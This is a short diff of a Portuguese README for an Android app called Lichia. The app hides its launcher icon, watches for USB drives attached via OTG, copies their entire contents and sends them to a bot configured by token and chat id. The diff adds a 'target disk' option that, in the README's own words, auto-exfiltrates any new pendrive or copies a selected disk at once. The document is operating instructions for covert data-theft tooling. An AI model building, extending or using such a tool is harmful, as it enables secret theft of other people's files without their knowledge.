@@ -69,8 +69,10 @@ app-mobile/app/src/main/java/br/com/lichia/app/
 Uso:
 1. Instale o APK, abra, preencha token + chat id, "conceder acesso a arquivos"
    (All files access), "salvar e ativar watcher".
-2. "esconder ícone" remove o launcher; reabre por Ajustes → Apps → Lichia → Abrir.
-3. Pendrive encaixado via OTG → copia tudo e manda pro bot.
+2. Cartão "disco alvo": Auto exfiltra qualquer pendrive novo; escolha um disco
+   montado para restringir — e ao salvar, o disco selecionado é copiado na hora.
+3. "esconder ícone" remove o launcher; reabre por Ajustes → Apps → Lichia → Abrir.
+4. Pendrive encaixado via OTG → copia tudo e manda pro bot.
 
 Build local:
 ```
